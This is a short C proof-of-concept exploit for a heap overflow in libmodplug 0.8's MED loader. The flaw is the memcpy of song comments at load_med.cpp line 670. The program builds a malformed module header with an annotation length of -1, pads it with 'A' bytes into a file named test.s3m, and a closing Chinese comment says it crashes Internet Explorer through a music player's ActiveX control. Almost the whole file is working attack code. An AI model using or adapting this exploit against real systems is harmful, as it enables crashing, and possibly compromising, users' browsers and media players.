/*
libmodplug v0.8  
load_med.cpp  
    BOOL CSoundFile::ReadMed(const BYTE *lpStream, DWORD dwMemLength)  
        line 670: memcpy(m_lpszSongComments, lpStream+annotxt, annolen);  
*/  
  
/*  
    author: dummy  
    e-mail: dummyz@126.com  
 
    date: 2008/02/25  
*/  
  
#include <windows.h>   
#include <stdio.h>   
  
#pragma pack(1)   
  
typedef struct tagMEDMODULEHEADER   
{   
    DWORD id;        // MMD1-MMD3   
    DWORD modlen;    // Size of file   
    DWORD song;        // Position in file for this song   
    WORD psecnum;   
    WORD pseq;   
    DWORD blockarr;    // Position in file for blocks   
    DWORD mmdflags;   
    DWORD smplarr;    // Position in file for samples   
    DWORD reserved;   
    DWORD expdata;    // Absolute offset in file for ExpData (0 if not present)   
    DWORD reserved2;   
    WORD pstate;   
    WORD pblock;   
    WORD pline;   
    WORD pseqnum;   
    WORD actplayline;   
    BYTE counter;   
    BYTE extra_songs;    // # of songs - 1   
} MEDMODULEHEADER;   
  
typedef struct tagMMD0SAMPLE   
{   
    WORD rep, replen;   
    BYTE midich;   
    BYTE midipreset;   
    BYTE svol;   
    signed char strans;   
} MMD0SAMPLE;   
  
// MMD0/MMD1 song header   
typedef struct tagMMD0SONGHEADER   
{   
    MMD0SAMPLE sample[63];   
    WORD numblocks;        // # of blocks   
    WORD songlen;        // # of entries used in playseq   
    BYTE playseq[256];    // Play sequence   
    WORD deftempo;        // BPM tempo   
    signed char playtransp;    // Play transpose   
    BYTE flags;            // 0x10: Hex Volumes | 0x20: ST/NT/PT Slides | 0x40: 8 Channels song   
    BYTE flags2;        // [b4-b0]+1: Tempo LPB, 0x20: tempo mode, 0x80: mix_conv=on   
    BYTE tempo2;        // tempo TPL   
    BYTE trkvol[16];    // track volumes   
    BYTE mastervol;        // master volume   
    BYTE numsamples;    // # of samples (max=63)   
} MMD0SONGHEADER;   
  
typedef struct tagMMD0EXP   
{   
    DWORD nextmod;            // File offset of next Hdr   
    DWORD exp_smp;            // Pointer to extra instrument data   
    WORD s_ext_entries;        // Number of extra instrument entries   
    WORD s_ext_entrsz;        // Size of extra instrument data   
    DWORD annotxt;   
    DWORD annolen;   
    DWORD iinfo;            // Instrument names   
    WORD i_ext_entries;      
    WORD i_ext_entrsz;   
    DWORD jumpmask;   
    DWORD rgbtable;   
    BYTE channelsplit[4];    // Only used if 8ch_conv (extra channel for every nonzero entry)   
    DWORD n_info;   
    DWORD songname;            // Song name   
    DWORD songnamelen;   
    DWORD dumps;   
    DWORD mmdinfo;   
    DWORD mmdrexx;   
    DWORD mmdcmd3x;   
    DWORD trackinfo_ofs;    // ptr to song->numtracks ptrs to tag lists   
    DWORD effectinfo_ofs;    // ptr to group ptrs   
    DWORD tag_end;   
} MMD0EXP;   
  
#pragma pack()   
  
// Byte swapping functions from the GNU C Library and libsdl   
  
/* Swap bytes in 16 bit value. */  
#ifdef __GNUC__   
# define bswap_16(x) \   
    (__extension__                                  \   
     ({ unsigned short int __bsx = (x);                          \   
        ((((__bsx) >> 8) & 0xff) | (((__bsx) & 0xff) << 8)); }))   
#else   
static __inline unsigned short int  
bswap_16 (unsigned short int __bsx)   
{   
return ((((__bsx) >> 8) & 0xff) | (((__bsx) & 0xff) << 8));   
}   
#endif   
  
/* Swap bytes in 32 bit value. */  
#ifdef __GNUC__   
# define bswap_32(x) \   
    (__extension__                                  \   
     ({ unsigned int __bsx = (x);                          \   
        ((((__bsx) & 0xff000000) >> 24) | (((__bsx) & 0x00ff0000) >> 8) |    \   
    (((__bsx) & 0x0000ff00) << 8) | (((__bsx) & 0x000000ff) << 24)); }))   
#else   
static __inline unsigned int  
bswap_32 (unsigned int __bsx)   
{   
return ((((__bsx) & 0xff000000) >> 24) | (((__bsx) & 0x00ff0000) >> 8) |   
    (((__bsx) & 0x0000ff00) << 8) | (((__bsx) & 0x000000ff) << 24));   
}   
#endif   
  
#ifdef WORDS_BIGENDIAN   
#define bswapLE16(X) bswap_16(X)   
#define bswapLE32(X) bswap_32(X)   
#define bswapBE16(X) (X)   
#define bswapBE32(X) (X)   
#else   
#define bswapLE16(X) (X)   
#define bswapLE32(X) (X)   
#define bswapBE16(X) bswap_16(X)   
#define bswapBE32(X) bswap_32(X)   
#endif   
  
int main()   
{   
    MEDMODULEHEADER mmh;   
    MMD0SONGHEADER msh;   
    MMD0EXP mex;   
    FILE* file;   
    long p;   
  
    memset(&mmh, 0, sizeof (mmh));   
    memset(&msh, 0, sizeof (msh));   
    memset(&mex, 0, sizeof (mex));   
      
    p = 0;   
  
    mmh.id = 0x30444D4D; // version = '0'   
  
    p += sizeof (MEDMODULEHEADER);   
    mmh.song = bswapBE32(p);   
  
    p += sizeof (MMD0SONGHEADER);   
    mmh.expdata = bswapBE32(p);   
      
    p += sizeof (MMD0EXP);   
    mex.annolen = bswapBE32(-1);   
    mex.annotxt = bswapBE32(p);   
      
    file = fopen("test.s3m", "wb+");   
    if ( file == NULL )   
    {   
        printf("create file failed!\n");   
    }   
    else  
    {   
        fwrite(&mmh, 1, sizeof (mmh), file);   
        fwrite(&msh, 1, sizeof (msh), file);   
        fwrite(&mex, 1, sizeof (mex), file);   
          
        while ( ftell(file) < 0x1000 )   
        {   
            fwrite("AAAAAAAAAAAAAAAAAAAA", 1, 16, file);   
        }   
  
        fclose(file);   
  
        printf("successed!\n");   
    }   
  
    return 0;   
}   
  
/*  
最新的千千静听提供了 ax, 下面是在 Ie 中触发此漏洞。会导致 ie 崩溃。  
*/   
